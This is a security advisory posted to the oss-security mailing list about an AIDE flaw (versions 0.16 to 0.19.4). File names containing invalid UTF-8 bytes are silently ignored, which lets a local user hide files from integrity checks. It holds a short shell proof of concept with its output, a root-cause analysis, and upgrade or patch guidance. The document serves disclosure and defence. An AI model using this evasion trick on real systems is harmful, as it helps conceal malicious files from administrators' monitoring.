X-Archive-Source: openwall-scrape
X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2026/10/22/4
Message-ID: <20261022140204.GA2@magnesium.vonhaugwitz.com>
Date: Thu, 22 Oct 2026 16:02:19 +0200
From: Hannes von Haugwitz <hannes@...haugwitz.com>
To: oss-security@...ts.openwall.com
Subject: aide (>= 0.16 <= 0.19.4) improper handling of file names containing invalid UTF-8 byte sequences (AIDE detection bypass) [GHSA-wq25-fm54-5q3q, CVE pending]
Content-Type: text/plain; charset=utf-8

Summary
=======

Rajesh Pangare discovered that AIDE, a host-based file and directory integrity
checker, improperly handles file names with invalid UTF-8 byte sequences. An
attacker can craft a malicious file or directory name by including invalid
UTF-8 bytes so that the file/directory is silently ignored by AIDE. A local
user can exploit this to bypass the AIDE detection of malicious files.

Project
=======

AIDE (Advanced Intrusion Detection Environment)

Affected versions
=================

AIDE >= 0.16, <= 0.19.4

CVE ID
======

A CVE ID has been requested, but is not yet available; please cross-reference
this vulnerability as GHSA-wq25-fm54-5q3q for now. The advisory will be
updated, as soon as a CVE ID is available.

Proof of concept
================

    $ mkdir test
    $ touch test/"$(printf 'invalid_\x80_byte.txt')"
    $ touch test/regular_file.txt
    $ aide --config <(printf -- "database_in=file:/dev/null\nroot_prefix = ./test\n/ R") --check
    Start timestamp: 2026-10-17 19:30:35 +0200 (AIDE 0.19.4)
    AIDE found differences between database and filesystem!!
    Root prefix: ./test

    Summary:
      Total number of entries:	2
      Added entries:		2
      Removed entries:		0
      Changed entries:		0

    ---------------------------------------------------
    Added entries:
    ---------------------------------------------------

    d++++++++++++++++++: /
    f++++++++++++++++++: /regular_file.txt

    ---------------------------------------------------
    The attributes of the (uncompressed) database(s):
    ---------------------------------------------------

    /dev/null
     SHA256    : 47DEQpj8HBSa+/TImW+5JCeuQeRkm5NM
                 pJWZG3hSuFU=
     SHA512    : z4PhNX7vuL3xVChQ1m2AB9Yg5AULVxXc
                 g/SpIdNs6c5H0NE8XYXysP+DGNKHfuwv
                 Y7kxvUdBeoGlODJ6+SfaPg==
     STRIBOG256: P1OaIT6XyALMIp1HTGqjKoJaNgsqkzqU
                 n9klII2c4bs=
     STRIBOG512: jpRdogmqhp8EVZKFKbyuRnnphzq3B7VT
                 FfVs65i+8Kc2L3FVKDVu6DzaXyqsTGrS
                 ujpxXBvNgcuOn5C/TBwaig==
     SHA512/256: xnK40e9W7Sirh8NiLFEUBpvdOte4+XN0
                 mNDAHs7wlno=
     SHA3-256  : p//G+L8e12ZRwUdWoGHWYvWA/03kO0n6
                 gtgKS4D4Q0o=
     SHA3-512  : pp9zzKI6msXItWfcGFp1bpfJghZP4lhZ
                 4NHcwUdcgKYVshI68fX5TBHj6UAsOsVY
                 9QAZnZW20+MBdYWGKB3NJg==


    End timestamp: 2026-10-17 19:30:35 +0200 (run time: 0m 0s)


The report correctly shows the addition of `regular_file.txt` but misses the
addition of the malicious file. The malicious file is also not added to the
AIDE database.

Analysis
========

The vulnerability is caused by improper handling of UTF-8 validation errors
returned from `pcre2_match` function, resulting in malicious file names never
matching any regular expression rule.

This allows a user to craft a file name including invalid UTF-8 byte sequences
to effectively hide the file from AIDE detection.

Mitigation
==========

Upgrade to AIDE v0.19.5

Alternatively apply the provided patch:

aide-0.19_GHSA-wq25-fm54-5q3q_invalid-utf-8.patch

Credit
======

The issue was reported by Rajesh Pangare.

References
==========
[AIDE](https://aide.github.io)
[v0.19.5](https://github.com/aide/aide/releases/tag/v0.19.5)
[GHSA-wq25-fm54-5q3q](https://github.com/aide/aide/security/advisories/GHSA-wq25-fm54-5q3q)

View attachment "aide-0.19_GHSA-wq25-fm54-5q3q_invalid-utf-8.patch" of type "text/x-diff" (3432 bytes)

Download attachment "signature.asc" of type "application/pgp-signature" (660 bytes)
